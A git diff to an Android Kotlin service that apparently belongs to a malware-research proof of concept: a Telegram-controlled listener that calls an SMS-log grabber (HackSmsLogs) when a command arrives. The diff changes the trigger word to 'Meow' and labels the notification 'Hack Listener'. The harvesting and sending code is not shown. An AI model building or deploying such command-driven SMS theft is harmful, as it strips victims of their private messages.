@@ -6,7 +6,6 @@ import android.content.Intent
 import android.os.Build
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
-import com.pengrad.telegrambot.request.SendMessage
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 
@@ -14,7 +13,6 @@ import android.util.Log
 import cocomelonc.hack.tools.HackNetwork
 import cocomelonc.hack.tools.HackSmsLogs
 import kotlinx.coroutines.CoroutineScope
-import okhttp3.internal.notifyAll
 
 class TelegramService() : Service() {
 
@@ -66,18 +64,18 @@ class TelegramService() : Service() {
 
     private fun processCommand(command: String) {
         // fetch commands
-        if (command.contains("SMSLOGS")) {
+        if (command.contains("Meow")) {
             HackSmsLogs(applicationContext).getSmsLogs()
             Log.d("TelegramService", "{$command}")
         } else {
-            Log.d("TelegramService", "UNKNOWN COMMAND: {$command}")
+            Log.d("TelegramService", "Unknown command: {$command}")
         }
     }
 
     private fun createNotification(): Notification {
         return NotificationCompat.Builder(this, notificationChannelId)
-            .setContentTitle("Telegram Listener")
-            .setContentText("Listening for new messages...")
+            .setContentTitle("Hack Listener")
+            .setContentText("Listening for new messages")
             .setSmallIcon(android.R.drawable.ic_dialog_info)
             .build()
     }
@@ -89,7 +87,6 @@ class TelegramService() : Service() {
                 "Telegram Listener Service",
                 NotificationManager.IMPORTANCE_LOW
             )
-//            notificationManager.createNotificationChannel(channel)
             val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             notificationManager.createNotificationChannel(channel)
         }
